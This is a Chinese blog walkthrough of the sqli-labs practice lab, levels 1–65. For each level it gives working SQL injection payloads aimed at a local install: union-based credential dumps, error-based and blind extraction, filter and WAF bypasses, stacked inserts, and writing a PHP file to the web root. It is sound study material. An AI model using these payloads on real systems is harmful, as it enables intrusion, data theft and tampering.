---
title: sqli-labs 1-65通关教程
date: 2019-03-24 20:39:11
tags: sql injection
categories: 攻防渗透
---

[TOC]

# 前记

为体系化梳理注入的知识体系，刷了一遍sqli-labs，做完后参考其他人的教程和手册，查漏补缺。

sql注入的分类？？

**1.基于从服务器接收到的响应** 

​    1.1基于错误的 SQL 注入 

​    1.2联合查询的类型 

​    1.3堆查询注射 

​    1.4SQL 盲注 

​        1.4.1基于布尔 SQL 盲注 

​        1.4.2基于时间的 SQL 盲注 

​        1.4.3基于报错的 SQL 盲注 

**2.基于如何处理输入的 SQL 查询(数据类型)** 

​    2.1基于字符串 

​    2.2数字或整数为基础的 

**3.基于程度和顺序的注入(哪里发生了影响)** 

​    3.1 一阶注射 

​    3.2 二阶注射 

**4.基于注入点的位置上的** 

​    4.1通过用户输入的表单输入点 

​    4.2通过搜索框注入

​    4.3页面任意变量传递点

​    4.4通过headers变量注入 (Cookie UA referer x-forward-for etc.) 

**5.基于数据包形式结构** 

​    5.1GET

​    5.2POST

​    5.3AUTH(登录认证型)

**6.基于sql语句结构** 

​    where 

​    order by 

**7.另类注入** 

​    7.1宽字节注入

​    7.2编码变形



#Page-1 (Basic Injections)



##第1关 

报错注入 

源码：$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1”; 

时间盲注：http://127.0.0.1/sqli-labs/Less-1/?id=1' and sleep(5) and 'abc'='abc 

http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 3 — a 

http://127.0.0.1/sqli-labs/Less-1/?id=-9670' UNION SELECT NULL,database(),NULL — - 

http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata -- - 

http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security';-- - 

http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users';-- - 

http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(username,0x5e,password),3 from users;-- - 

**写shell**

http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,0x3c3f70687020706870696e666f28293b203f3e into outfile '//Applications/XAMPP/htdocs/onlytest/shell.php' -- - 





##第2关 

报错注入 

数字类型注入，不用闭合双引号 

http://127.0.0.1/sqli-labs/Less-2?id=-1 UNION select null,database(),null-- - 



##第3关 

报错注入 单引号括号注入 

源码：$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1"; 

http://127.0.0.1/sqli-labs/Less-3?id=1') order by 4 --- 

http://127.0.0.1/sqli-labs/Less-3?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- - 

http://127.0.0.1/sqli-labs/Less-3?id=1') union select if(ascii(mid(database(),1,1))=115,1,(select 1 union select 2)),null,null -- - 



##第4关 

报错注入 双引号+括号 

源码：$id = '"' . $id . '"'; 

$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1”; 



http://127.0.0.1/sqli-labs/Less-4?id=1")order by 4 -- # 

http://127.0.0.1/sqli-labs/Less-4?id=1") and sleep(5) — - 

http://127.0.0.1/sqli-labs/Less-4?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- # 



##第5关 

没有明确回显，盲注，单引号闭合；基于时间的盲注&基于布尔的盲注 

源码：$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1”; 

http://127.0.0.1/sqli-labs/Less-5?id=-1' and sleep(5) -- -  

http://127.0.0.1/sqli-labs/Less-5?id=-1' union select if(ascii(mid(database(),1,1))=115,1,(select 1 union select 2)),null,null — - 

http://127.0.0.1/sqli-labs/Less-5?id=1' and if(length(database())=8,sleep(5),1) — - 

判断当前库为security,通过多行查询 

http://127.0.0.1/sqli-labs/Less-5?id=-1' and if(left(database(),8)=0x7365637572697479,(select 1 union select 2),1) — - 

判断有哪些表 

http://127.0.0.1/sqli-labs/Less-5?id=?id=1' and if( left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users' ,(select 1 union select 2),1)--+ 



##第6关 

双引号盲注 

http://127.0.0.1/sqli-labs/Less-6?id=1" and sleep(5) — - 

http://127.0.0.1/sqli-labs/Less-6?id=1" and if(length(database())=8,sleeP(5),1)-- - 



##第7关 

双括号单引号盲注，写shell，前提是当前账号有写入权限且知道路径 

http://127.0.0.1/sqli-labs/Less-7?id=1')) and sleeP(5) -- - 

http://127.0.0.1/sqli-labs/Less-7?id=1')) and if(length(database())=8,sleeP(5),1)-- - 





##第8关 

布尔型单引号GET盲注 

http://127.0.0.1/sqli-labs/Less-8?id=1' and left(database(),8)='security'-- - 



##第9关 

单引号基于时间盲注 

http://127.0.0.1/sqli-labs/Less-9?id=1' and if(length(database())=8,sleeP(5),1)-- - 



##第10关 

双引号基于时间盲注 

http://127.0.0.1/sqli-labs/Less-10?id=1" and if(left(database(),8)='security',sleep(5),1)-- - 



##第11关 

POST型，基于报错单引号 报错注入 

uname=admin' or ''='&passwd=admin&submit=Submit 

uname=admin' and extractvalue(1,concat(0x7e,(select user()))) -- -&passwd=admin&submit=Submit 

*uname=admin' and length(user())=14 -- -&passwd=admin&submit=Submit*



##第12关 

POST型，双引号+括号 报错注入 

uname=admin") and length(database())=8 -- -&passwd=admin&submit=Submit 

uname=admin") and extractvalue(1,concat(0x7e,(select database()))) -- -&passwd=admin&submit=Submit 

*uname=admin") and if((select table_name from information_schema.tables where table_schema = 'security' limit 3,1)='users',(select 1 union select 2),1) -- -&passwd=admin&submit=Submit*



##第13关 

POST 单引号+括号，报错注入 

uname=admin') and extractvalue(1,concat(0x7e,(select user()))) -- -&passwd=admin&submit=Submit 

uname=admin') and updatexml(1, concat(0x7e, version()), 1) -- -&passwd=admin&submit=Submit 



##第14关 

POST 双引号，报错注入 

uname=admin" and updatexml(1, concat(0x7e, version()), 1) -- -&passwd=admin&submit=Submit 



##第15关 

盲注 

uname=admin'and database()='security'-- -&passwd=admin&submit=Submit 



##第16关 

双引号+括号，盲注 

uname=admin")and database()='security'-- -&passwd=admin&submit=Submit 



##第17关 

Update 注入 

增加了过滤函数check_input 

stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。 

is_numeric：检测是否为数字字符串，可为负数和小数 

ctype_digit：检测字符串中的字符是否都是数字，负数和小数会检测不通过 

mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 



Php程序对username进行了check_input 过滤，但是没有对password进行过滤 

uname=admin&passwd=test1324'and updatexml(1,concat(0x7e,user()),1) -- +&submit=Submit 

uname=admin&passwd=test1324'and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema='security'limit 3,1)),1) -- +&submit=Submit 



##第18关 

referer注入，uname & password 均有check_input 过滤，但header 没有过滤。需要构造values的字段。 

源码：$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"; 

​            mysql_query($insert); 

​            print_r(mysql_error());   

//此payload 相当于构造三个字段去拼凑sql语句，然后注释后面，进行报错注入

User-Agent: firefox'and updatexml(1,concat(0x7e,database()),1),1,1) -- + 



##第19关 

同样的道理，类似18关，注入点在referer，此payload 相当于构造一个字段 

Referer: x' and updatexml(1,concat(0x7e,user()),1) and ‘ 



OR (SELECT 8370 FROM(SELECT COUNT(*),CONCAT(0x716a767671,(SELECT (ELT(8370=8370,1))),0x71706a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Jgwd'='Jgwd 



##第20关 

第147行，$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"; 

Cookie: uname=admin'and updatexml(1,concat(0x7e,user()),1) -- + 



##第21关 

单引号+括号，有报错函数 

源码：$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1”; 

**payload**

Cookie: uname=YScpIHVuaW9uIHNlbGVjdCAxLDIsdXNlcigpIw== 

(Decode:a') union select 1,2,user()#) 





##第22关 

双引号+base64 

存在mysql报错函数 

源代码：

*$cookee = base64_decode($cookee);*

*$cookee1 = '"'. $cookee. '"';*

*echo "</font>";*

*$sql="SELECT \* FROM users WHERE username=$cookee1 LIMIT 0,1";*

**Payload:**

Cookie: uname=YSIgdW5pb24gc2VsZWN0IDEsMix1c2VyKCkj 

（decode: a" union select 1,2,user()#） 



#Page-2 (Adv Injections)

##第23关 

单撇报错注入 

过滤了注释符— # 

**源代码:**

*$reg = "/#/";*

*$reg1 = "/--/";*

*$replace = "";*

*$id = preg_replace($reg, $replace, $id);*

*$id = preg_replace($reg1, $replace, $id);*

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; 

**payload**

http://127.0.0.1/sqli-labs/Less-23/?id=-1'  union select 1,user(),3’ 

不使用注释符，但可以拼接闭合sql语句

Sql语句为单引号闭合，所以payload可以先用一个单引号闭合前面的单引号，然后再最后放置一个单引号和语句中的后面的单引号闭合

Payload 为什么前面的数字使用-1 是因为 sql语句后面有limit ，如果前面的条件为真，则回显前面的结果。

SELECT * FROM users WHERE id='-2' union select 1,version(),3'' LIMIT 0,1 





##第24关 

二阶sql注入，通过注册时将特殊字符代入 

注册时候注册admin’# 账号，这样在修改密码的时候通过单撇去闭合前面的sql语句，然后用#去注释后面的sql代码 

UPDATE users SET PASSWORD='123456' where username='admin'#' and password='test1324' <font size="3" color="#FFFF00"><center>Password successfully updated</center>   



mysql_escape_string 函数，转义单撇双引号类特殊字符，但存储的数据库的时候是输入的原字符。不会把转义字符也存入到数据内； 

payload解释 

通过login_create.php页面创建账号， 

Sql语句内使用双引号可以使用转义 



##第25关 

过滤了and 和 or 

源代码 

$id= preg_replace('/or/i',"", ​$id);         //strip out OR (non case sensitive) 

$id= preg_replace('/AND/i',"", $id);        //Strip out AND (non case  

sensitive) 

$sql="SELECT * FROM users WHERE id='​$id' LIMIT 0,1”; 



http://127.0.0.1/sqli-labs/Less-25?id=-1' union select 1,user(),3 — + 

http://127.0.0.1/sqli-labs/Less-25?id=-1' oorr sleeP(5) -- + 

http://127.0.0.1/sqli-labs/Less-25?id=1' anandd left(database(),8)='security'— - 

http://127.0.0.1/sqli-labs/Less-25?id=1' %26%26 left(database(),8)='security'-- - 



过滤了and or 类可以使用

anandd

%26%26

**有一个疑问**，为什么使用普通的url编码可以（例如%26%26，但是&& 竟然不可以）

一般绕过and or 类，可以考虑绕&&，||，%26%26，大小写，双写关键字(anandd,andand)，编码 

**在burp里面，将get 数据包更改post ,可以不用进行url编码，方便注入操作。**



##第25a关 

数字型注入，过滤了and or  

http://127.0.0.1/sqli-labs/Less-25a?id=1 anandd sleep(5) -- - 





##第26关 

与25关一样，sql语句没有单撇，过滤了and 和 or 但没有递归过滤 

http://127.0.0.1/sqli-labs/Less-25a?id=1 anandd sleep(5) — - 

当然不使用and也没有问题 

http://127.0.0.1/sqli-labs/Less-25a?id=-1 union select 1,user(),3 -- - 



##第26a关 

过滤了or and /* — # 空格 / 

Ps:%a0 空格的意思，类unix操作系统可以绕过，但windows 并不解析这个字符 

源代码 

​    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive) 

​    $id= preg_replace('/and/i',"", $id);        //Strip out AND (non case sensitive) 

​    $id= preg_replace('/[\/\*]/',"", $id);      //strip out /* 

​    $id= preg_replace('/[--]/',"", $id);        //Strip out -- 

​    $id= preg_replace('/[#]/',"", ​$id);         //Strip out # 

​    $id= preg_replace('/[\s]/',"", $id);        //Strip out spaces 

​    $id= preg_replace('/[\/\\\\]/',"", $id);        //Strip out slashes 

Payload:  使用%a0 进行绕过

http://127.0.0.1/sqli-labs/Less-26?id='%a0unioN%a0select(1),(user()),(3)' 



##第27关 

基于原来的黑名单，又增加了过滤union select, 但程序的黑名单都是基于关键字的并没有递归，所以通过混淆大小写可以绕过。 

另外需要提示，由于存在limit 0,1 所以前面的必须不成长的条件，否则显示前条件的结果，**不知道为什么id=-1 不可以报错**，可能是因为过滤了-导致-1即为1？因为1和-1的结果是一样的。。。 

http://127.0.0.1/sqli-labs/Less-27?id='%a0uNiOn%a0seLeCt%a0(1),(database()),(3)' 



##第27a关 

双引号闭合，使用%a0代替空格 

127.0.0.1/sqli-labs/Less-27a?id=1"and%a0left(database(),8)='security'" 



##第28关 

单引号加括号，过滤了直接的union select ,可以使用union%a0select 来绕过 

由于存在括号和单引号，所以需要同时闭合，同时也要构造后面的(‘ ‘), 仍然需要使用and去构造后面的闭合。 

源代码：$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1"; 

http://127.0.0.1/sqli-labs/Less-28?id=')union%a0select%a0(1),(database()),(3)%a0and%a0('1')=(‘1 

亦可 

')union%a0select%a0(1),(database()),(3)%a0and%a0('')=(' 



##第28a关 

http://127.0.0.1/sqli-labs/Less-28a?id=1')%a0and%a0ascii(substr(database(),1,1))=115 %a0and%a0('')=(' 



##第29关 

index.php: http://127.0.0.1/sqli-labs/Less-29?id=-11111' union select 1,user(),3’ 

http://127.0.0.1/sqli-labs/Less-29/login.php **没做出来** 



函数 

explode() 函数把字符串打散为数组。 



**29-31 的login.php 均为绕过waf, ,index.php 跟普通注入一样，存在waf的页面时login.php** 

**index.php类页面不再分析，主要分析login.php，因为login.php 才使用waf**



##第29关 

login.php 

单引号+HPP 

Waf 只能数字，经过两个过滤函数，java_implimentation() whitelist() 

​    $qs = $_SERVER['QUERY_STRING']; 

​    $hint=$qs; 

​    $id1=java_implimentation($qs); 

​    $id=$_GET['id']; 

​    // echo $id; 

​    whitelist($id1); 





**Payload:双参数**

http://127.0.0.1/sqli-labs/Less-29/login.php?id=1&id=-2'union select 1,user(),3-- - 

关于HPP，参数污染，各编程语言的特性 



| Web服务器        | 参数获取函数                | 获取到的参数                |
| ---------------- | --------------------------- | --------------------------- |
| PHP/Apache       | $_GET(“par”)                | Last                        |
| JSP/Tomcat       | Request.getParameter(“par”) | First                       |
| Perl(CGI)/Apache | Param(“par”)                | First                       |
| Python/Apache    | Getvalue(“par”)             | All(List)                   |
| ASP/IIS          | Request.QueryString(“par”)  | All(comma-delimited string) |

有两个问题需要跟踪： 

第一个，代码当中是id1 进了过滤函数，而$id 没有进入白名单不知道为什么waf生效。。。 whitelist($id1); 

第二个，代码中的函数存在的意义，为什么取值到第一个id的时候就停止了java_implimentation（） 

第三个，实际的利用场景如何？ 

答疑： 

第一个，虽然sql语句用的是id1,但程序是在if下面一行一行执行的，id1的来源是url请求参数经过java_implimentation过来的。所以也会执行whitelist(id1); 

​    $qs = $_SERVER['QUERY_STRING']; 

​    $hint=$qs; 

​    $id1=java_implimentation($qs); 

​    $id=$_GET['id']; 

​    whitelist($id1); 

第二个，java_implimentation() 函数释义。 

function java_implimentation($query_string) 

{ 

​    $q_s = ​$query_string; 

​    $qs_array= explode("&",​$q_s); 

​    foreach($qs_array as $key => $value) 

​    { 

​        $val=substr($value,0,2); 

​        if($val=="id") 

​        { 

​            $id_value=substr($value,3,30); 

​            return $id_value; 

​            break; //不再遍历第二个 

​        } 

​    } 

} 

假如请求地址内容为 login.php?id=12&id=abc 

通过explode函数以&分割，     

var_dump($qs_array);  //索引数组 

array(2) { [0]=> string(5) "id=12" [1]=> string(4) "id=b” } 

所以取得$value 便为id=12 和 id=b 

$var 的值，就是id

然后经过if去判断相等否，相等则return ,然后break ，不会遍历第二个id=b的 value



然后php+apache的组合是获取最后一个参数（相同参数），所以最后一个参数走进了sql语句，而第一个参数交给了waf去过滤（只要保证第一个参数是正常的，就不会处罚waf拦截）

第三个问题，利用场景，的确存在waf的拦截就是根据第一个参数的值来进行过滤的。 





## 第30关

 login.php 

双引号+HPP 

双引号 

http://127.0.0.1/sqli-labs/Less-30/login.php?id=1&id=0"union select 1,database(),3-- - 



## 第32关

login.php 

双引号+括号+HPP 

http://127.0.0.1/sqli-labs/Less-31/login.php?id=1&id=0") union select 1,version(),3-- - 



第32关 

过滤了 “ ‘ \反斜线符号; 

原理上使用了 

mysql_query("SET NAMES gbk"); 

考虑宽字节注入。 

原理上的payload 是 -111%df%27 union select 1,user(),3 — - 

本次没有成功 





##第33关 

经过了addslashes()函数，还又存在mysql_query(“set names gbk”); 所以存在宽字节注入 

宽字节注入 

http://127.0.0.1/sqli-labs/Less-33?id=-1%df' union select 1,user(),3 -- - 

真正的加固方法，应该是统一set 了编码，还要设置character_set_client=binary  

问题主要出在连接层。 





##第34关 

也是宽字节注入，POST型 

因为源代码中的select 是select 了两个字段，所以后面union 也需要是两个字段，而不是表中的3列。 

源代码：mysql_query("SET NAMES gbk"); 

​    @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"; 

payload 

uname=admin%df%27 union select 1,user()-- -&passwd=admin&submit=Submit 



##第35关 

绕过addslashes 

$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1”; 

源代码中并没有使用单引号闭合，所以addslashes() 转义就失去了意义，所以就不用构造单撇了 

http://127.0.0.1/sqli-labs/Less-35?id=-1 union select 1,user(),3-- - 





##第36关 

绕过mysql_real_escape_string 

函数释义，对特定字符进行转义操作，编码的字符是 NUL（ASCII 0）、\n、\r、\、'、" 和 Control-Z 



源代码： 

$uname = mysql_real_escape_string($uname1); 

$passwd= mysql_real_escape_string($passwd1); 

mysql_query("SET NAMES gbk"); 

@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1”; 

所以还是考虑宽字节注入 



http://127.0.0.1/sqli-labs/Less-36?id=111111%df' union select 1,user(),3 -- - 







##第37关 

Post 型，绕过mysql_real_escape_string()，同36关 

仍然使用宽字节注入，由于源码中的select 选择了两个字段，所以union select 也匹配两个字段 

uname=admin%df' union select 1,database() -- -&passwd=111...aaa&submit=Submit 



##第38关 

普通注入 

and '1'=‘1 // 一般使用此语句，主要是是闭合sql语句后单撇 

Payload: 

http://127.0.0.1/sqli-labs/Less-38?id=-11111'  union select 1,version(),3 ' 





#Page-3 (Stacked Injections)

SQLi-LABS Page-3 (Stacked Injections)

##第38关
虽然union select 可以搞定，但不是考察点。
重点在mysqli_multi_query()
mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。

区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句；
而堆叠注入可以执行的是任意的语句。

payload
http://127.0.0.1/sqli-labs/Less-38?id=11111' ;insert into users (username,password) values ('zhangwuji','meichaofeng')-- -

##第39关
http://127.0.0.1/sqli-labs/Less-39?id=2 ; insert into users (username,password) values ('guojing','huangrong') -- -

##第40关
http://127.0.0.1/sqli-labs/Less-40?id=1') and sleep(6) — -
http://127.0.0.1/sqli-labs/Less-40?id=1') and if(database()='security', sleep(6),sleep(0)) -- -
以上payload 并不能体现是堆叠查询

下面面的payload 体现了堆叠，但的确盲，需要通过数据库查看，实际场景可能需要判断功能点，例如登录
http://127.0.0.1/sqli-labs/Less-40?id=1'); insert into users (username,password) values ('linghuchong','renyingying') — -

##第41关
数字类型的堆叠注入
http://127.0.0.1/sqli-labs/Less-41?id=1; insert into users (id,username,password) values (39,'dongxie','xidu') -- +

##第42关
报错堆叠
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
$password = $_POST["login_password”];

Username 使用了mysqli_real_escape_string() 函数过滤，这个会转义。
mysqli::real_escape_string -- mysqli::escape_string -- mysqli_real_escape_string — 根据当前连接的字符集，对于 SQL 语句中的特殊字符进行转义

Password 没有过滤
所以payload
login_user=admin&login_password=123456';create table stacktab (dd int) -- +&mysubmit=Login

##第43关
字符串加括号
login_user=admin&login_password=123456');create table stacktab43 (dd int) -- +&mysubmit=Login

##第44关
盲注
密码成功与否都会执行后面的堆叠语句。
login_user=admin&login_password=123456';create table stacktab44 (dd int) -- +&mysubmit=Login

##第45关
login_user=admin&login_password=12345');create table newtab (id int) -- +&mysubmit=Login
其中43关和45关利用方式一样，对比代码发现43关多一些sql报错的代码
也就是报错类，一般会有好sql语句报错提示，例如mysqli_error()

~~~php
else
{
   echo '<font size="5" color= "#FFFF00">';
   print_r(mysqli_error($con1));
   echo "</font>";
}
}
else
{
   echo '<font size="5" color= "#FFFF00">';
   print_r(mysqli_error($con1));
   echo "</font>";
}
~~~



##第46关
Order by 注入，基于报错，数字类型
http://127.0.0.1/sqli-labs/Less-46?sort=if(database()='security',(select 1 union select 2),1)
提示Subquery returns more than 1 row 则证明条件表达式正确 （前提是基于报错，存在类似mysql_error()函数）
http://127.0.0.1/sqli-labs/Less-46?sort=if(database()='security1',id,username) //这样的判断也可以，根据列的名称。
但如果使用数字就不行了，可以直接跟数字，但是不能跟运算得来的数字。如果是运算来的数字，则会默认按照排序

基于报错的payload
http://127.0.0.1/sqli-labs/Less-46?sort=1 and(updatexml(1,concat(0x7e,(select database())),0)) -- -

##第47关
比46关多个单撇，字符串类型，有报错函数
http://127.0.0.1/sqli-labs/Less-47?sort=1%27and if(database()='security',(select 1 union select 2),username) — -

基于报错
http://127.0.0.1/sqli-labs/Less-47?sort=1%27 and(updatexml(1,concat(0x7e,(select user())),0)) -- -

##第48关
盲注
order by 数字型盲注
在MYSQL的官方手册，里面针对RAND()的提示大概意思就是，在ORDER BY从句里面不能使用RAND()函数，因为这样会导致数据列被多次扫描

payload
http://127.0.0.1/sqli-labs/Less-48?sort=1,(select 1 from (select sleep(5))a)

另外的payload （适用于数字类型，在字符串类型不适用）
http://127.0.0.1/sqli-labs/Less-48?sort=rand(ascii(left(database(),1))=115)-- -
不太清楚小数的意义


MariaDB [security]> select rand(1=1);
+---------------------+
| rand(1=1)           |
+---------------------+
| 0.40540353712197724 |
+---------------------+
1 row in set (0.00 sec)

MariaDB [security]> select rand(1=2);
+---------------------+
| rand(1=2)           |
+---------------------+
| 0.15522042769493574 |
+---------------------+
1 row in set (0.00 sec)

相当于rand(true)  rand(false)

##第49关
字符串类型盲注入order by
存在报错函数就可以使用updatexml 或者select 1 union select 2 类 来报错判断
但可以使用基于时间的盲注（也就是延时注入），这样的结果排序也乱序，但确定条件正确与否。
http://127.0.0.1/sqli-labs/Less-49?sort=1%27 and if(database()='security',sleep(5),1) -- -

注意if 前跟and 


select * from users  order by 1 into outfile '/Applications/XAMPP/htdocs/onlytest/0319.txt';

根据这一特性，可以通过写文件来判断order by 注入效果
payload:
http://127.0.0.1/sqli-labs/Less-49?sort=2'%20into%20outfile%20%20 "/Applications/XAMPP/htdocs/onlytest/0320.txt"-- -

##第50关
Order by 注入，报错注入，堆叠
http://127.0.0.1/sqli-labs/Less-50?sort=1;insert into users (id,username,password) values (15,'dongxie','xidu')-- -
以上这个payload 并不完美，因为没有体现报错。
如下payload可以体现报错，但没有体现堆叠
http://127.0.0.1/sqli-labs/Less-50?sort=1 and(updatexml(1,concat(0x7e,(select user())),0)) -- -

##第51关
http://127.0.0.1/sqli-labs/Less-51?sort=1';insert into users (id,username,password) values (16,'nandi','beigai')-- -

##第52关
盲注
与第50关的区别，就是50管存在mysqli_error($con1)函数
http://127.0.0.1/sqli-labs/Less-52?sort=1;insert into users (id,username,password) values (17,'wangchaohyang','linchaoying')-- -

##第53关
与第52关差不多，主要是字符串类型，盲注入
http://127.0.0.1/sqli-labs/Less-53?sort=1';insert into users (id,username,password) values (18,'linghuchong','renyingying')-- -





#Page-4 (Challenges)

##第54关 

目标：十次内获得key 的值，每次都随便变化表明、列明 

$sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"; 



http://127.0.0.1/sqli-labs/Less-54/index.php?id=-1' union select 1,database(),version() — - 



查询哪些表 

http://127.0.0.1/sqli-labs/Less-54/index.php?id=-1' union select 1,2, table_name from information_schema.tables where table_schema=database() — - 

//HLRAMAT8OB 

查询哪些列 

http://127.0.0.1/sqli-labs/Less-54/index.php?id=-1' union select 1,2, group_concat(column_name) from information_schema.columns where  table_name='HLRAMAT8OB’ -- - 

//id,sessid,secret_A0S3,tryy 



查询指定列的内容 

http://127.0.0.1/sqli-labs/Less-54/index.php?id=-1' union select 1,2, secret_A0S3 from challenges.HLRAMAT8OB — - 

//KhNq8YYPQbwOVY9BCMVgMrhu 

提交value 就是答案 



##第55关 

要求14次 

$sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1”; 



http://127.0.0.1/sqli-labs/Less-55/index.php?id=0) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- - 



http://127.0.0.1/sqli-labs/Less-55/index.php?id=0) union select 1,2,group_concat(column_name) from information_schema.columns where table_name='M93G5TMAL3' -- - 



http://127.0.0.1/sqli-labs/Less-55/index.php?id=0) union select 1,2,secret_QPDL from challenges.M93G5TMAL3 -- - 





##第56关 

闭合单撇和括号 

$sql="SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1”; 

http://127.0.0.1/sqli-labs/Less-56/index.php?id=0') union select 1,2,database() -- - 



##第57关 

闭合双引号 



http://127.0.0.1/sqli-labs/Less-57/index.php?id=0" union select 1,2,database() -- - 



##第58关 

比54关，回显做了白名单处理 

$sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1”; 

Payload: 

http://127.0.0.1/sqli-labs/Less-58/index.php?id=0%27 and(updatexml(1,concat(0x7e,(select database())),0)) -- - 

//获得表的名称3ESATPRS7P 

http://127.0.0.1/sqli-labs/Less-58/index.php?id=0%27 and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),0)) -- - 

//获取列名

http://127.0.0.1/sqli-labs/Less-58/index.php?id=0%27 and(updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='3ESATPRS7P')),0)) -- - 

//获取值 

http://127.0.0.1/sqli-labs/Less-58/index.php?id=0%27 and(updatexml(1,concat(0x7e,(select secret_56Z4 from challenges.3ESATPRS7P)),0)) -- - 



没有太明白怎么double query 



##第59关 

同58关，sql语句没有单引号了 

http://127.0.0.1/sqli-labs/Less-59/index.php?id=0 and(updatexml(1,concat(0x7e,(select database())),0)) -- - 



##第60关 

源代码比59关的源代码多了（“”） 

$id = '("'.$id.'")'; 

闭合id即可 

http://127.0.0.1/sqli-labs/Less-60/index.php?id=0") and updatexml(1,concat(0x7e,(select database())),0) -- - 



##第61关 

$sql="SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1”; 



http://127.0.0.1/sqli-labs/Less-61/index.php?id=0')) and updatexml(1,concat(0x7e,(select database())),0) -- - 





##第62关 

回显处已白名单数组处理 

没有sql报错函数，盲注(基于时间、基于布尔、基于报错盲注)，这里使用基于时间的盲注 

PS:有个知识点盲区，**基于报错的盲注**，（**有回显不一定有报错，有报错也不一定有回显**） 

例如有报错函数的盲注就叫做基于报错类型的盲注，例如if(1=1,(select 1 union select 2),1) 

$sql="SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1"; 

Payload: 

http://127.0.0.1/sqli-labs/Less-62?id=1') and if(1=1,sleep(5),1) -- - 

http://127.0.0.1/sqli-labs/Less-62?id=1') and if(database()='challenges',sleep(5),1) -- - 

猜测第一个数据的字母 //chr(78)=N 

http://127.0.0.1/sqli-labs/Less-62?id=1') and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=78,sleep(5),1) -- - 

http://127.0.0.1/sqli-labs/Less-62?id=1') and if(left((select group_concat(table_name) from information_schema.tables where table_schema=database()),10)='NW9K6F9XJY',sleep(5),1) -- - 

猜测第一个字段的字母 //chr(105)=i 

http://127.0.0.1/sqli-labs/Less-62?id=1') and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='NW9K6F9XJY'),1,1))=105,sleep(5),1) -- - 







##第63关 

同62，单引号闭合 

http://127.0.0.1/sqli-labs/Less-63?id=1' and if(database()='challenges', sleep(5),1) -- - 



##第64关 

$sql="SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1”; 



http://127.0.0.1/sqli-labs/Less-64?id=1)) and if(database()='challenges', sleep(5),1) -- - 





##第65关 

$id = '"'.$id.'"'; 

$sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1”; 

Payload: 

http://127.0.0.1/sqli-labs/Less-65?id=1") and if(database()='challenges', sleep(5),1) -- - 



第66关后，没有了。 



#Referer

https://blog.csdn.net/qq_41420747/article/details/81836327

https://blog.csdn.net/harrywade/article/details/81842491

https://github.com/lcamry/sqli-labs

https://github.com/WangYihang/sqli-labs



#后记

做完后，发现有些payload 并没有完全按照源码的意图去fuzzing

基于漏洞的生命周期（原理、利用、加固、绕过），还是应该多思考基础原理，尤其是底层数据库的一些特性。

